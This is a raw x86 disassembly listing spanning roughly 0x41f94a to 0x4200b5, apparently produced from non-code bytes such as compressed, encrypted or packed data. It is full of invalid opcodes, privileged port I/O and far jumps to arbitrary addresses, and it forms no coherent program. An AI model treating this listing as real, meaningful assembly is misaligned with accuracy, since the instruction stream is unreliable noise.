  41f94a:	cmp    eax,0x55fcf90f
  41f94f:	or     eax,0xb32fd00e
  41f954:	push   edi
  41f955:	mov    esi,0x143de15c
  41f95a:	xor    DWORD PTR [ebx+0x5d],eax
  41f95d:	inc    ecx
  41f95e:	ret    0xe28d
  41f961:	mov    ch,0xf9
  41f963:	push   edx
  41f964:	ja     0x41f9d1
  41f966:	push   ecx
  41f967:	or     dl,BYTE PTR [eax+ebx*2-0x19]
  41f96b:	push   eax
  41f96c:	(bad)  
  41f96d:	hlt    
  41f96e:	ret    
  41f96f:	pop    edx
  41f970:	or     DWORD PTR [ebx-0x5eba862e],edx
  41f976:	(bad)  [ebx-0x61]
  41f979:	mov    dh,0x86
  41f97b:	je     0x41f912
  41f97d:	xchg   esp,eax
  41f97e:	lahf   
  41f97f:	push   ebx
  41f980:	out    0xe0,eax
  41f982:	out    dx,eax
  41f983:	retf   0x1a0c
  41f986:	js     0x41f922
  41f988:	dec    esi
  41f989:	sub    DWORD PTR [ecx+ebp*2],ecx
  41f98c:	fwait
  41f98d:	push   ebp
  41f98e:	mov    bh,0x8b
  41f990:	xor    ebp,esi
  41f992:	cmp    eax,esi
  41f994:	inc    esi
  41f995:	sar    al,0x4b
  41f998:	repz int 0xe9
  41f99b:	aam    0x36
  41f99d:	sub    ebx,DWORD PTR [edx+0x212d5daa]
  41f9a3:	jne    0x41f93f
  41f9a5:	sbb    eax,0xfa1b7063
  41f9aa:	xchg   BYTE PTR [eax],bh
  41f9ac:	xor    dh,BYTE PTR [edi-0x49215ae1]
  41f9b2:	jmp    0xcd50:0x8d1d7e20
  41f9b9:	ins    BYTE PTR es:[edi],dx
  41f9ba:	adc    bl,dh
  41f9bc:	xlat   BYTE PTR ds:[ebx]
  41f9bd:	call   0x4875bf36
  41f9c2:	imul   eax,edx,0x6a
  41f9c5:	in     eax,dx
  41f9c6:	jmp    0x41fa20
  41f9c8:	fst    st(1)
  41f9ca:	mov    al,0xd5
  41f9cc:	aas    
  41f9cd:	push   esi
  41f9ce:	int    0xc9
  41f9d0:	test   eax,0x7969735d
  41f9d5:	dec    esp
  41f9d6:	push   ebx
  41f9d7:	adc    DWORD PTR [edi+0x16],esp
  41f9da:	and    eax,0xf7f6dc59
  41f9df:	fwait
  41f9e0:	mov    cl,BYTE PTR [ebx+0x66f805c5]
  41f9e6:	lock add al,0x81
  41f9e9:	(bad)  
  41f9ea:	das    
  41f9eb:	retf   0x4564
  41f9ee:	fistp  DWORD PTR [eax-0x1bc42f8e]
  41f9f4:	shl    eax,cl
  41f9f6:	les    esi,FWORD PTR [eax]
  41f9f8:	add    BYTE PTR [edi-0x77],0x76
  41f9fc:	mov    al,ds:0xd1937f3e
  41fa01:	addr16 inc ebx
  41fa03:	out    dx,al
  41fa04:	ds stos BYTE PTR es:[edi],al
  41fa06:	pop    ds
  41fa07:	lahf   
  41fa08:	fwait
  41fa09:	daa    
  41fa0a:	xchg   ebp,eax
  41fa0b:	dec    esp
  41fa0c:	push   ebx
  41fa0d:	jecxz  0x41f9c2
  41fa0f:	xchg   ebx,eax
  41fa10:	int3   
  41fa11:	pop    ss
  41fa12:	and    BYTE PTR [edx-0x2f],ch
  41fa15:	sub    eax,0x199470ac
  41fa1a:	fdivr  DWORD PTR [ebx+ebp*2]
  41fa1d:	xchg   esi,edi
  41fa1f:	mov    dl,0xf1
  41fa21:	xchg   si,ax
  41fa23:	daa    
  41fa24:	lahf   
  41fa25:	jbe    0x41fa5a
  41fa27:	xchg   ebx,eax
  41fa28:	sahf   
  41fa29:	jmp    DWORD PTR [ebp-0x53ef8681]
  41fa2f:	jge    0x41fa27
  41fa31:	aaa    
  41fa32:	sahf   
  41fa33:	(bad)  
  41fa34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa35:	and    ebx,ebp
  41fa37:	pop    ecx
  41fa38:	in     al,0x61
  41fa3a:	(bad)  
  41fa3c:	add    al,0x87
  41fa3e:	dec    esi
  41fa3f:	pop    eax
  41fa40:	jns    0x41fa16
  41fa42:	in     eax,dx
  41fa43:	jbe    0x41fa90
  41fa45:	sub    DWORD PTR [esi],0x3087b9bb
  41fa4b:	neg    BYTE PTR ds:0x9412c715
  41fa51:	(bad)  
  41fa52:	pushf  
  41fa53:	mov    al,ds:0x7ab011b5
  41fa58:	stc    
  41fa59:	jl     0x41fa3f
  41fa5b:	bnd ret 0xae72
  41fa5f:	stos   DWORD PTR es:[edi],eax
  41fa60:	pop    esp
  41fa61:	mov    es,WORD PTR ds:0x2fd1eeb4
  41fa67:	int    0xf0
  41fa69:	arpl   WORD PTR [ebp-0x626482c],bp
  41fa6f:	in     al,dx
  41fa70:	imul   edx,DWORD PTR [ebp-0x6f],0x4626d996
  41fa77:	stos   BYTE PTR es:[edi],al
  41fa78:	inc    eax
  41fa79:	add    ch,BYTE PTR [edi]
  41fa7b:	and    eax,0x33a78391
  41fa80:	push   0x9eeb06b2
  41fa85:	and    eax,0xbc49b9ef
  41fa8a:	inc    eax
  41fa8b:	xchg   ebx,eax
  41fa8c:	dec    esi
  41fa8d:	and    cl,al
  41fa8f:	xor    eax,0x1fa15a2c
  41fa94:	xchg   ebx,eax
  41fa95:	jns    0x41fadc
  41fa97:	pusha  
  41fa98:	inc    ebp
  41fa99:	outs   dx,DWORD PTR ds:[esi]
  41fa9a:	jmp    0x27b1:0x1d735337
  41faa1:	fcomp  DWORD PTR [edx]
  41faa3:	leave  
  41faa4:	jne    0x41fa3b
  41faa6:	push   edx
  41faa7:	or     eax,0x68f7c554
  41faac:	into   
  41faad:	ss dec esp
  41faaf:	jmp    0x3370ec6d
  41fab4:	pop    ds
  41fab5:	mov    gs,WORD PTR [ecx-0xa]
  41fab8:	inc    ebp
  41fab9:	pop    ds
  41faba:	pop    esp
  41fabb:	in     eax,dx
  41fabc:	shr    bh,0x7b
  41fabf:	hlt    
  41fac0:	dec    edi
  41fac1:	xchg   esp,eax
  41fac2:	cmc    
  41fac3:	adc    esi,edi
  41fac5:	push   ebp
  41fac6:	pop    esp
  41fac7:	call   0xf6a35c8f
  41facc:	call   0x5d76:0x444feadf
  41fad3:	xor    DWORD PTR [edi],edx
  41fad5:	or     DWORD PTR [edx-0x52],ecx
  41fad8:	pop    ds
  41fad9:	inc    ebx
  41fada:	ds ss ins BYTE PTR es:[edi],dx
  41fadd:	retf   
  41fade:	xchg   ebx,eax
  41fadf:	maxps  xmm5,xmm6
  41fae2:	push   ds
  41fae3:	jl     0x41fab4
  41fae5:	fnstcw WORD PTR [eax+0x66eb1c21]
  41faeb:	push   eax
  41faec:	bound  esi,QWORD PTR [ebx]
  41faee:	leave  
  41faef:	dec    eax
  41faf0:	dec    edx
  41faf1:	mov    ds:0x2c1e1ea5,al
  41faf6:	or     al,0x81
  41faf8:	sbb    al,0x4c
  41fafa:	pop    eax
  41fafb:	or     bh,cl
  41fafd:	pop    es
  41fafe:	mov    dl,0x7f
  41fb00:	ins    BYTE PTR es:[edi],dx
  41fb01:	stos   BYTE PTR es:[edi],al
  41fb02:	and    eax,0x6a60eaa8
  41fb07:	push   cs
  41fb08:	jecxz  0x41fb5c
  41fb0a:	sbb    bh,BYTE PTR [ecx+esi*8]
  41fb0d:	push   ecx
  41fb0e:	cs test cl,cl
  41fb11:	leave  
  41fb12:	pusha  
  41fb13:	or     esi,DWORD PTR [ecx+0x5c]
  41fb16:	dec    esp
  41fb17:	pop    ecx
  41fb18:	sbb    al,0xde
  41fb1a:	xor    al,0x18
  41fb1c:	add    DWORD PTR [ebx+eiz*2+0x1dde686b],0x68
  41fb24:	cdq    
  41fb25:	jnp    0x41fb5d
  41fb27:	sbb    ch,BYTE PTR [eax-0x6a]
  41fb2a:	xor    al,0x53
  41fb2c:	sub    esp,eax
  41fb2e:	rol    DWORD PTR [ebx-0x4bdacec2],0x6
  41fb35:	inc    esi
  41fb36:	adc    DWORD PTR [eax],ebx
  41fb38:	mov    al,ds:0x30f1111c
  41fb3d:	test   DWORD PTR [eax-0x3184a722],0x37c1392a
  41fb47:	inc    edx
  41fb48:	xchg   ebp,eax
  41fb49:	or     eax,0xc3715775
  41fb4e:	or     al,0x5e
  41fb50:	pushf  
  41fb51:	dec    esp
  41fb52:	add    eax,0xb3703794
  41fb57:	xor    edi,edx
  41fb59:	jg     0x41faf1
  41fb5b:	in     eax,dx
  41fb5c:	pop    esi
  41fb5d:	fstp   TBYTE PTR [ecx-0xd]
  41fb60:	std    
  41fb61:	(bad)
  41fb64:	xor    DWORD PTR [edi+0x67acf00f],edx
  41fb6a:	inc    edi
  41fb6b:	loop   0x41fb40
  41fb6d:	push   esp
  41fb6e:	xchg   esi,eax
  41fb6f:	sbb    ecx,edx
  41fb71:	popf   
  41fb72:	cwde   
  41fb73:	and    edi,esp
  41fb75:	sub    BYTE PTR [ecx+0x70],ch
  41fb78:	jmp    0x41fbf3
  41fb7a:	sub    eax,0x905f8ec1
  41fb7f:	cdq    
  41fb80:	dec    ebx
  41fb81:	xchg   esp,eax
  41fb82:	out    0xd,al
  41fb84:	and    ah,BYTE PTR [esi-0x30]
  41fb87:	xchg   esi,eax
  41fb88:	pop    ss
  41fb89:	das    
  41fb8a:	and    esp,DWORD PTR [eax+0x5c4de055]
  41fb90:	hlt    
  41fb91:	push   0x1f443e03
  41fb96:	dec    ecx
  41fb97:	out    0x2f,eax
  41fb99:	call   0xcbd3346c
  41fb9e:	add    BYTE PTR [edi],ch
  41fba0:	scas   al,BYTE PTR es:[edi]
  41fba1:	(bad)  
  41fba2:	inc    eax
  41fba3:	or     BYTE PTR [bx+di],dl
  41fba6:	lods   eax,DWORD PTR ds:[esi]
  41fba7:	je     0x41fbcb
  41fba9:	pop    DWORD PTR [edi]
  41fbab:	(bad)  
  41fbac:	data16 addr16 aad 0x1a
  41fbb0:	mov    ecx,0x713b1582
  41fbb5:	out    dx,al
  41fbb6:	xlat   BYTE PTR fs:[ebx]
  41fbb8:	ds pop edx
  41fbba:	imul   eax,DWORD PTR [ebp+0x33],0xb87e4796
  41fbc1:	loope  0x41fb57
  41fbc3:	adc    bh,BYTE PTR [ebp-0x65]
  41fbc6:	pop    esp
  41fbc7:	in     al,dx
  41fbc8:	fidiv  WORD PTR [edx]
  41fbca:	push   0x57
  41fbcc:	mov    eax,0x1a500e53
  41fbd1:	sbb    eax,0xf432254d
  41fbd6:	and    BYTE PTR [ebx+edx*8-0x421a94ee],bl
  41fbdd:	jmp    0x468b:0x58628211
  41fbe4:	leave  
  41fbe5:	bnd jbe 0x41fc0b
  41fbe8:	test   DWORD PTR [edi],edi
  41fbea:	inc    DWORD PTR [edi-0x72]
  41fbed:	cs pop eax
  41fbef:	mov    eax,0x4b36e376
  41fbf4:	repnz fwait
  41fbf6:	lods   eax,DWORD PTR ds:[esi]
  41fbf7:	mov    edi,0xc038c93
  41fbfc:	mov    ah,0xb
  41fbfe:	sub    eax,0x5e3699ac
  41fc03:	cdq    
  41fc04:	add    al,0xa4
  41fc06:	push   ebp
  41fc07:	inc    ebp
  41fc08:	shl    DWORD PTR [edi+0x428ccec6],cl
  41fc0e:	aaa    
  41fc0f:	es jmp 0x41fba0
  41fc12:	jno    0x41fc65
  41fc14:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc16:	push   edi
  41fc17:	cmp    al,0x3a
  41fc19:	int3   
  41fc1a:	mov    eax,0xad4f9316
  41fc1f:	retf   
  41fc20:	push   edi
  41fc21:	cmp    dh,dl
  41fc23:	xor    eax,0x6501b07a
  41fc28:	sbb    bh,BYTE PTR [eax+0x4622a6b7]
  41fc2e:	and    BYTE PTR [esp+ebx*8-0x3f],al
  41fc32:	jl     0x41fc82
  41fc34:	ret    0x3461
  41fc37:	mov    gs,WORD PTR [edx-0xb]
  41fc3a:	jge    0x41fc1d
  41fc3c:	ins    DWORD PTR es:[edi],dx
  41fc3d:	cwde   
  41fc3e:	dec    ebp
  41fc3f:	std    
  41fc40:	inc    esp
  41fc41:	adc    BYTE PTR [ecx],al
  41fc43:	jo     0x41fc8c
  41fc45:	ret    0xa58a
  41fc48:	pushf  
  41fc49:	rcr    al,cl
  41fc4b:	or     BYTE PTR fs:[edx-0x1b],bl
  41fc4f:	mov    al,ds:0x634b6c8b
  41fc54:	rcl    DWORD PTR [ecx],0x16
  41fc57:	push   ecx
  41fc58:	sahf   
  41fc59:	mov    ch,0xe0
  41fc5b:	inc    ebx
  41fc5c:	test   al,0xba
  41fc5e:	popa   
  41fc5f:	push   edx
  41fc60:	in     eax,dx
  41fc61:	mov    al,0x4c
  41fc63:	mov    ebp,DWORD PTR [edx+0x3ea7291]
  41fc69:	mov    edx,0x5c9da92b
  41fc6e:	pop    ss
  41fc6f:	mov    ah,0xf1
  41fc71:	ss in  al,dx
  41fc73:	pop    edx
  41fc74:	loope  0x41fc6d
  41fc76:	pop    ss
  41fc77:	dec    esi
  41fc78:	stos   BYTE PTR es:[edi],al
  41fc79:	ins    BYTE PTR es:[edi],dx
  41fc7a:	ins    BYTE PTR es:[edi],dx
  41fc7b:	fmul   DWORD PTR [esi+0x72]
  41fc7e:	xchg   edi,esi
  41fc80:	cwde   
  41fc81:	ds mov ebp,0x32e54831
  41fc87:	mov    ch,0xe6
  41fc89:	fs (bad) 
  41fc8c:	sub    ecx,DWORD PTR [ebx+0x15]
  41fc8f:	mov    bl,0x17
  41fc91:	ret    
  41fc92:	(bad)  
  41fc93:	jno    0x41fc8d
  41fc95:	mov    ch,0x4c
  41fc97:	scas   eax,DWORD PTR es:[edi]
  41fc98:	dec    bp
  41fc9a:	jns    0x41fd0f
  41fc9c:	or     ebx,edx
  41fc9e:	rcl    BYTE PTR [eax-0x758c495c],1
  41fca4:	fisub  WORD PTR [edx-0x7a]
  41fca7:	or     DWORD PTR [edi-0x614f89db],esi
  41fcad:	mov    dl,0x65
  41fcaf:	rol    BYTE PTR [esi+0x3804055a],cl
  41fcb5:	out    0x7,eax
  41fcb7:	nop
  41fcb8:	adc    al,0x59
  41fcba:	jecxz  0x41fd01
  41fcbc:	repnz pop esp
  41fcbe:	icebp  
  41fcbf:	and    edx,ecx
  41fcc1:	xor    ah,BYTE PTR [edx]
  41fcc3:	stos   DWORD PTR es:[edi],eax
  41fcc4:	sbb    al,0xe5
  41fcc6:	test   al,0x83
  41fcc8:	mov    bl,0x5b
  41fcca:	pop    ds
  41fccb:	lods   eax,DWORD PTR ds:[esi]
  41fccc:	mov    eax,0x40e95765
  41fcd1:	in     eax,dx
  41fcd2:	and    ebx,DWORD PTR [edx+ebx*2]
  41fcd5:	adc    eax,0x6107ae93
  41fcda:	or     DWORD PTR [ebp+ebp*2-0x4a],ecx
  41fcde:	lock test al,0x39
  41fce1:	cmp    dh,cl
  41fce3:	imul   esi,DWORD PTR [ebp+0x3f],0xc8046055
  41fcea:	push   ecx
  41fceb:	nop    esi
  41fcee:	xchg   edx,eax
  41fcef:	adc    DWORD PTR [ebx-0x5d80145a],edx
  41fcf5:	pop    ds
  41fcf6:	cmc    
  41fcf7:	daa    
  41fcf8:	cmp    eax,DWORD PTR [eax]
  41fcfa:	ficomp WORD PTR [edi]
  41fcfc:	adc    ebp,DWORD PTR [edx+0x17edfabb]
  41fd02:	sbb    eax,0x86ec854b
  41fd07:	pusha  
  41fd08:	(bad)  
  41fd09:	cmc    
  41fd0a:	push   cs
  41fd0b:	mov    edi,0x4ff1f5a3
  41fd10:	fadd   QWORD PTR [ecx+0x5d81cea3]
  41fd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd17:	or     DWORD PTR [edi+0x1c],ebp
  41fd1a:	jo     0x41fcfb
  41fd1c:	jno    0x41fcb6
  41fd1e:	fistp  WORD PTR [ecx]
  41fd20:	jae    0x41fd7e
  41fd22:	je     0x41fcc6
  41fd24:	aad    0x50
  41fd26:	jb     0x41fd8b
  41fd28:	and    ecx,DWORD PTR ds:0x7890e09a
  41fd2e:	mov    al,0xf5
  41fd30:	pop    ebp
  41fd31:	out    0x33,eax
  41fd33:	xchg   DWORD PTR [edx-0x2719987e],esp
  41fd39:	push   0xd1f460
  41fd3e:	add    BYTE PTR [eax],al
  41fd40:	add    BYTE PTR [eax],al
  41fd42:	mov    ds:0xb713b617,al
  41fd47:	mov    bl,0xa7
  41fd49:	mov    bh,0xb
  41fd4b:	add    BYTE PTR [edi+0x78c791dc],dh
  41fd51:	daa    
  41fd52:	int3   
  41fd53:	ja     0x41fd56
  41fd55:	add    bl,dh
  41fd57:	add    al,0x0
  41fd59:	add    ah,bl
  41fd5b:	push   ebp
  41fd5c:	sub    al,0xb6
  41fd5e:	(bad)  
  41fd5f:	add    al,0x63
  41fd61:	dec    esi
  41fd62:	adc    BYTE PTR [eax-0x6289beca],0xe1
  41fd69:	cs in  eax,dx
  41fd6b:	fwait
  41fd6c:	mov    WORD PTR [esi+0x69],gs
  41fd6f:	lods   al,BYTE PTR ds:[esi]
  41fd70:	pop    ecx
  41fd71:	icebp  
  41fd72:	mov    esi,DWORD PTR [esi+ebx*2]
  41fd75:	jbe    0x41fd2d
  41fd77:	sbb    DWORD PTR [eax],ebx
  41fd79:	ds push edx
  41fd7b:	mov    esp,0x99cfc1ee
  41fd80:	enter  0x96c9,0xa8
  41fd84:	jecxz  0x41fd56
  41fd86:	(bad)  
  41fd87:	cmp    DWORD PTR [ecx+ebp*4+0x5e56156c],esi
  41fd8e:	mov    al,BYTE PTR [ebp+0x3fe43311]
  41fd94:	inc    ebx
  41fd95:	push   0xab493d4e
  41fd9a:	out    0x1e,eax
  41fd9c:	mov    ebp,0x254ef09b
  41fda1:	leave  
  41fda2:	xor    DWORD PTR [ebp+0x1],esp
  41fda5:	pop    edi
  41fda6:	scas   eax,DWORD PTR es:[edi]
  41fda7:	pusha  
  41fda8:	ficom  DWORD PTR [eax+0x1e466ce5]
  41fdae:	scas   al,BYTE PTR es:[edi]
  41fdaf:	sbb    ecx,DWORD PTR [ebp+0x7c]
  41fdb2:	repnz pop esp
  41fdb4:	bound  ecx,QWORD PTR [ecx-0x6bd6d68a]
  41fdba:	or     dh,BYTE PTR [ecx+0x3db011de]
  41fdc0:	sub    BYTE PTR [ebx],cl
  41fdc2:	(bad)  
  41fdc3:	(bad)  
  41fdc4:	ss scas eax,DWORD PTR es:[edi]
  41fdc6:	jno    0x41fe3a
  41fdc8:	cmp    BYTE PTR [ebx-0x3b3c8c4c],dl
  41fdce:	pop    eax
  41fdcf:	addr16 push ss
  41fdd1:	add    BYTE PTR [eax+0x338abd9f],dh
  41fdd7:	in     eax,dx
  41fdd8:	test   BYTE PTR [eax+0x64f53d93],dl
  41fdde:	dec    edx
  41fddf:	mov    bl,0xa
  41fde1:	mov    ebx,0xc32e4bc3
  41fde6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fde7:	fsub   QWORD PTR [esi+esi*8]
  41fdea:	or     cl,bl
  41fdec:	shl    edi,0xd8
  41fdef:	mov    WORD PTR [eax-0x602fc9e8],cs
  41fdf5:	inc    ecx
  41fdf6:	aad    0xe0
  41fdf8:	push   ecx
  41fdf9:	mov    esi,0xd03bd7e0
  41fdfe:	add    BYTE PTR [esi-0x13],dl
  41fe01:	xchg   esp,eax
  41fe02:	pop    ss
  41fe03:	retf   
  41fe04:	dec    esp
  41fe05:	(bad)  
  41fe06:	ds mov bh,0xd4
  41fe09:	cmp    al,0x5a
  41fe0b:	lahf   
  41fe0c:	push   eax
  41fe0d:	out    dx,eax
  41fe0e:	xor    edx,edi
  41fe10:	mov    es,WORD PTR [ecx]
  41fe12:	xor    BYTE PTR [edx-0x50],ch
  41fe15:	jmp    0x41fdc8
  41fe17:	add    al,0x8a
  41fe19:	dec    esp
  41fe1a:	jns    0x41fda0
  41fe1c:	ds scas eax,DWORD PTR es:[edi]
  41fe1e:	mov    edi,0xfcea421d
  41fe23:	cmc    
  41fe24:	arpl   WORD PTR [edi],si
  41fe26:	sbb    al,0xf6
  41fe28:	aad    0xca
  41fe2a:	scas   al,BYTE PTR es:[edi]
  41fe2b:	shl    dl,0xcf
  41fe2e:	mov    ah,0x37
  41fe30:	dec    DWORD PTR [ecx+0x3d]
  41fe33:	xchg   ebx,eax
  41fe34:	sbb    edi,ecx
  41fe36:	aas    
  41fe37:	xor    ch,BYTE PTR cs:[eax+eiz*2-0xc]
  41fe3c:	repz jbe 0x41fe20
  41fe3f:	add    cl,BYTE PTR [eax]
  41fe41:	sbb    eax,0xe9133362
  41fe46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe47:	mov    edx,0xaee714d
  41fe4c:	std    
  41fe4d:	test   BYTE PTR [ebx-0x29],bl
  41fe50:	stc    
  41fe51:	push   es
  41fe52:	adc    eax,0x216c68cf
  41fe57:	push   ebp
  41fe58:	mov    esi,ebp
  41fe5a:	cwde   
  41fe5b:	aas    
  41fe5c:	popa   
  41fe5d:	pop    edi
  41fe5e:	sbb    eax,0x9b4bc1ef
  41fe63:	ret    
  41fe64:	mov    ah,0x82
  41fe66:	jo     0x41fe36
  41fe68:	xchg   ebx,eax
  41fe69:	fisttp DWORD PTR [edi+ebx*2+0x7a2ba999]
  41fe70:	xor    DWORD PTR [ebx-0xc],esi
  41fe73:	jge    0x41feb4
  41fe75:	or     DWORD PTR [ecx],edi
  41fe77:	jle    0x41fe98
  41fe79:	ret    0xfc5d
  41fe7c:	mov    al,ds:0xd15efb01
  41fe81:	sub    BYTE PTR [edi-0x258c5105],al
  41fe87:	outs   dx,DWORD PTR ds:[esi]
  41fe88:	and    dh,BYTE PTR [eax*1-0x354ed36a]
  41fe8f:	stc    
  41fe90:	imul   DWORD PTR [ebx+0x4f1bef9e]
  41fe96:	pop    ds
  41fe97:	jmp    0xcb44:0x705950bc
  41fe9e:	mov    DWORD PTR [edi],ecx
  41fea0:	mov    ds:0xddd7f9a3,eax
  41fea5:	iret   
  41fea6:	repnz xchg esi,eax
  41fea8:	push   0xffffff97
  41feaa:	loopne 0x41fe69
  41feac:	mov    al,0xd9
  41feae:	test   eax,0xc0d00835
  41feb3:	inc    edx
  41feb4:	mov    ds:0x2eceb90b,al
  41feb9:	inc    edx
  41feba:	pop    edi
  41febb:	inc    eax
  41febc:	and    bl,BYTE PTR [eax]
  41febe:	xor    BYTE PTR [esi-0x12],bl
  41fec1:	add    al,BYTE PTR ds:0x6d2cf16c
  41fec7:	mov    edx,0xd59a3989
  41fecc:	push   edi
  41fecd:	outs   dx,BYTE PTR ds:[esi]
  41fece:	ins    DWORD PTR es:[edi],dx
  41fecf:	adc    al,0x3f
  41fed1:	popf   
  41fed2:	or     esp,esp
  41fed4:	les    edx,FWORD PTR [ebp-0x7c807c0f]
  41feda:	mov    ebp,0x816a0477
  41fedf:	fnsave [eax+0x38298254]
  41fee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fee6:	lods   al,BYTE PTR ds:[esi]
  41fee7:	inc    ecx
  41fee8:	mov    ebp,0x17a03098
  41feed:	sbb    bl,BYTE PTR [eax-0x150c0ff5]
  41fef3:	or     DWORD PTR [eax-0x14e20c0e],ebp
  41fef9:	jmp    0xf46d:0xcfb0a65d
  41ff00:	(bad)  
  41ff01:	rcr    BYTE PTR [ecx],1
  41ff03:	push   ss
  41ff04:	xchg   ecx,eax
  41ff05:	xchg   esi,eax
  41ff06:	xor    DWORD PTR [ebp+0xbb7e3b8],edx
  41ff0c:	mov    esp,0x7d615a20
  41ff11:	mov    cl,0xac
  41ff13:	das    
  41ff14:	sahf   
  41ff15:	cmp    BYTE PTR ds:0x2fc22545,al
  41ff1b:	cmp    DWORD PTR [esi],0x7533b110
  41ff21:	sub    al,dh
  41ff23:	(bad)  
  41ff24:	loope  0x41ff11
  41ff26:	pop    ss
  41ff27:	dec    edx
  41ff28:	add    DWORD PTR es:[edx],0x29b105fc
  41ff2f:	inc    ebx
  41ff30:	sub    cl,BYTE PTR [ebp+edi*1+0x11]
  41ff34:	fmul   QWORD PTR [esi+0x5bda64af]
  41ff3a:	popf   
  41ff3b:	cli    
  41ff3c:	adc    BYTE PTR [ebx-0x1c11cd22],ch
  41ff42:	xchg   ebx,eax
  41ff43:	push   eax
  41ff44:	mov    ah,bl
  41ff46:	into   
  41ff47:	xchg   esi,eax
  41ff48:	xchg   BYTE PTR cs:[eax],cl
  41ff4b:	test   BYTE PTR [eax+0x1e7f2bfe],ah
  41ff51:	int    0x94
  41ff53:	mov    dl,0x54
  41ff55:	mov    ?,WORD PTR [ecx+edi*1+0x5d6634b1]
  41ff5c:	sti    
  41ff5d:	push   es
  41ff5e:	enter  0xf2a1,0xdf
  41ff62:	ins    BYTE PTR es:[edi],dx
  41ff63:	(bad)  
  41ff64:	push   ebp
  41ff65:	pop    edx
  41ff66:	cli    
  41ff67:	pxor   mm5,QWORD PTR [ecx-0x1b]
  41ff6b:	adc    DWORD PTR [bx+0x12],0xdc04a21
  41ff73:	mov    WORD PTR [edi-0x48],es
  41ff76:	into   
  41ff77:	lea    ebx,[eax-0x32]
  41ff7a:	lods   al,BYTE PTR ds:[esi]
  41ff7b:	inc    ebp
  41ff7c:	jmp    0x41ffce
  41ff7e:	ins    DWORD PTR es:[edi],dx
  41ff7f:	or     DWORD PTR ds:0x947d929d,edx
  41ff85:	mov    edx,0x10c79720
  41ff8a:	mov    dh,BYTE PTR [ecx+0x2f]
  41ff8d:	push   eax
  41ff8e:	(bad)  
  41ff8f:	xchg   ebx,eax
  41ff90:	pushf  
  41ff91:	cmp    BYTE PTR [edx],0x32
  41ff94:	cmp    BYTE PTR [esi+0x5e],dl
  41ff97:	cli    
  41ff98:	push   cs
  41ff99:	call   0xc4b2:0xa250bd9b
  41ffa0:	inc    esp
  41ffa1:	xchg   esi,eax
  41ffa2:	out    dx,al
  41ffa3:	loopne 0x41ffdd
  41ffa5:	or     al,0x77
  41ffa7:	sbb    BYTE PTR [ebx],al
  41ffa9:	retf   0x852a
  41ffac:	ins    DWORD PTR es:[edi],dx
  41ffad:	data16 sbb BYTE PTR [edx+edi*8],bh
  41ffb1:	pop    ecx
  41ffb2:	fs xchg ecx,eax
  41ffb4:	std    
  41ffb5:	pop    esi
  41ffb6:	or     esi,esi
  41ffb8:	lods   al,BYTE PTR ds:[esi]
  41ffb9:	cmp    edx,DWORD PTR [ebp-0xcf0c16c]
  41ffbf:	mov    esi,0x221a6750
  41ffc4:	mov    edx,DWORD PTR [eax+0x3e]
  41ffc7:	or     al,0x4f
  41ffc9:	dec    edi
  41ffca:	sub    DWORD PTR [edx-0x6b3bcaf8],ebp
  41ffd0:	dec    edi
  41ffd1:	pop    eax
  41ffd2:	repz pop edi
  41ffd4:	xor    eax,0x3ba85f20
  41ffd9:	out    dx,al
  41ffda:	fwait
  41ffdb:	test   BYTE PTR [ebp+0x2d445ef3],0x85
  41ffe2:	pushf  
  41ffe3:	push   0x0
  41ffe5:	std    
  41ffe6:	cmp    eax,DWORD PTR [ecx-0x2eea6e03]
  41ffec:	adc    eax,DWORD PTR [edx-0x18a94050]
  41fff2:	fld    DWORD PTR [edi-0x58]
  41fff5:	leave  
  41fff6:	adc    al,0xd2
  41fff8:	icebp  
  41fff9:	or     bl,BYTE PTR [ebx+0x422d6087]
  41ffff:	fist   DWORD PTR ds:0x8aaaae54
  420005:	pushf  
  420006:	ficomp DWORD PTR [eax-0x298446ab]
  42000c:	sub    eax,0xdcfaa293
  420011:	xchg   ebx,eax
  420012:	sub    al,0xa
  420014:	jnp    0x420015
  420016:	retf   0xdf91
  420019:	mov    esp,0xf63ccfcd
  42001e:	ficomp WORD PTR [ebx+0x27e96d8e]
  420024:	(bad)  
  420025:	aam    0x7d
  420027:	dec    edi
  420028:	popf   
  420029:	sub    BYTE PTR [ebx-0x18e08a9b],bl
  42002f:	mov    eax,edi
  420031:	jle    0x420048
  420033:	das    
  420034:	adc    eax,DWORD PTR [edi+0x56]
  420037:	sbb    cl,0x37
  42003a:	daa    
  42003b:	xor    DWORD PTR [ecx],esi
  42003d:	or     ah,BYTE PTR [ecx-0x5ae5617d]
  420043:	mov    dh,0x53
  420045:	lods   eax,DWORD PTR ds:[esi]
  420046:	into   
  420047:	sub    ecx,edi
  420049:	mov    cs,WORD PTR [eax-0x4ad0767]
  42004f:	fld    TBYTE PTR ds:0x65dae324
  420055:	cmp    al,0x60
  420057:	arpl   WORD PTR [eax-0x1f51798f],di
  42005d:	dec    ebx
  42005e:	pop    ebx
  42005f:	mov    ch,0x8f
  420061:	sub    edx,DWORD PTR [ebx]
  420063:	scas   eax,DWORD PTR es:[edi]
  420064:	rcr    BYTE PTR [esi+ecx*1-0x238fe407],cl
  42006b:	rcl    DWORD PTR [esi],1
  42006d:	dec    edi
  42006e:	aaa    
  42006f:	push   0x54
  420071:	test   al,0x55
  420073:	mov    al,ds:0xa168bbff
  420078:	or     eax,0x5a5755e3
  42007d:	cmp    al,BYTE PTR [esi+0x64355e99]
  420083:	int3   
  420084:	mov    ?,WORD PTR [edi]
  420086:	push   ecx
  420087:	imul   edi,DWORD PTR [edx+0x28],0x271469e5
  42008e:	aam    0xe7
  420090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420091:	mov    eax,0xcbc49e32
  420096:	jne    0x42003b
  420098:	sar    DWORD PTR [edx-0x29e06e02],1
  42009e:	cli    
  42009f:	xor    al,0xec
  4200a1:	mov    bh,0xd1
  4200a3:	sub    ch,BYTE PTR [ebx+0x50]
  4200a6:	imul   ecx,esp,0x54
  4200a9:	jne    0x42004f
  4200ab:	daa    
  4200ac:	cmp    ah,ah
  4200ae:	(bad)  
  4200af:	fs daa 
  4200b1:	rcl    BYTE PTR [esi-0x4d],0x9d
  4200b5:	arpl   WORD PTR [ebp+edx*8-0x652ca159],cx
